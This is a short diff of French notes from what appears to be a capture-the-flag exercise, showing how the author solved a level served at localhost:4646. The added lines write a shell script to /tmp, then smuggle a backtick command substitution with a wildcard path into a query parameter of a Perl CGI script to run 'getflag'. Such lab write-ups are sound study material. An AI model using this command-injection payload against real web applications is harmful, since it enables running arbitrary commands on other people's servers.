@@ -1,7 +1,15 @@
-curl 'http://localhost:4646/level12.pl?x=valeur_x&y=valeur_y'
+creer un script dans /tmp/TEST.SH en maj
+chmod 777 /tmp/TEST.SH
+----
+#/bin/sh
 
-/tmp/xd
+getflag > /tmp/flag.txt
 
-comparaison faites avec y ?  
+----
 
-chercher a executer getflag 
+touch /tmp/flag.txt
+chmod 777 /tmp/flag.txt
+
+curl 'http://localhost:4646/level12.pl?x=`/*/TEST.SH`&y=kdjaf'
+
+cat /tmp/flag.txt
